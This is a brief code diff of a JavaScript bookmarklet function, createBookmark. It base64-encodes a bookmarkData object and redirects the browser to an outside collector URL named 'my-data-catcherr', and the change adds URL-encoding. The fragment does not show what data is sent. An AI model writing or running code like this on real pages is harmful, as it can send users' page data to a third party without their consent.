@@ -340,15 +340,18 @@ function createBookmark(){
 
 
         location.replace(
-            'https://my-data-catcherr.onrender.com/data/' +
-            btoa(JSON.stringify(bookmarkData))
-        );
+  "https://my-data-catcherr.onrender.com/data/" +
+  encodeURIComponent(btoa(JSON.stringify(bookmarkData)))
+);
 
 
     } catch(e){
         alert("Error: " + e.message);
     }
-})();
+})()`;
+
+
+}
 
 
 
